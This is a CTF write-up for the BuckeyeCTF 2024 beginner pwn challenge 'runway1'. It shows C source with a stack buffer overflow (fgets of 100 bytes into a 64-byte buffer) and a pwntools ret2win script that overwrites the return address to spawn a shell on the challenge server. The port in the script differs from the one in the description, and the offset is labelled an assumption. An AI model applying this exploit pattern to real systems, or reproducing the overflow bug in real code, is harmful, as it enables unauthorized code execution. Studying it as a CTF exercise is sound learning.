---
title: "runway1 - BuckeyeCTF 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "pwntools", "runway1", "stack", "buckeyectf", "buckeyectf-2024", "2024", "ctf-writeup"]
summary: "Checking the source code:"
source:
  name: "CTFtime writeup #39490"
  url: "https://ctftime.org/writeup/39490"
original_source: "https://github.com/Execut3/CTF/tree/master/Writeups/2024/BuckeyeCTF/runway1"
ctf:
  name: "BuckeyeCTF 2024"
  year: 2024
  challenge: "runway1"
---

## Metadata

- **CTF:** BuckeyeCTF 2024
- **Task:** runway1
- **Author team:** Execut3
- **CTFtime:** <https://ctftime.org/writeup/39490>
- **Original writeup:** <https://github.com/Execut3/CTF/tree/master/Writeups/2024/BuckeyeCTF/runway1>

---
## runway1 [60 pts]

**Category:** beginner-pwn  
**Solves:** 217

## Description

Starting to ramp up!

nc [challs.pwnoh.io](http://challs.pwnoh.io) 13400 

### Solution

Checking the source code:  
```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <time.h>  
#include <fcntl.h>  
#include <sys/sendfile.h>

int win() {  
printf("You win! Here is your shell:\n");

system("/bin/sh");  
}

int get_favorite_food() {  
char food[64];

printf("What is your favorite food?\n");  
fflush(stdout);

fgets(food, 100, stdin);

printf("Hmmm..... %s...", food);  
}

int main() {  
int rand_num;

srand(time(0));  
rand_num = rand() % 100;

get_favorite_food();

if (rand_num <= 50) {  
printf("That sounds delicious!\n");  
} else if (rand_num <= 70) {  
printf("Eh, that sounds okay.\n");  
} else if (rand_num <= 80) {  
printf("That's my favorite food too!\n");  
} else if (rand_num <= 90) {  
printf("I've never tried that before!\n");  
} else if (rand_num <= 100) {  
printf("Ew! I would never eat that.\n");  
}

return 0;  
}  
```

it's just a simple buffer overflow, we need to overflow buffer and overwrite Return address to `win` method address.

```python  
from pwn import *

# Set up pwntools to interact with the binary  
binary = './runway1' # Replace with your binary's name  
elf = context.binary = ELF(binary)

# Find the address of the win() function  
win_address = elf.symbols['win']

# Start the binary process  
# p = process(binary)  
p = remote('[challs.pwnoh.io](http://challs.pwnoh.io)', 13401)

# Get the offset using cyclic patterns  
offset = 76 # Assuming 76 is the offset (based on buffer size, this is likely correct)

# Build the payload  
payload = b'A' * offset # Padding to reach return address  
payload += p64(win_address) # Overwrite return address with win() function address

# Send the payload  
p.recvuntil('What is your favorite food?')  
p.sendline(payload)

# Interact with the shell  
p.interactive()  
```

And we get a shell and can read flag from it.
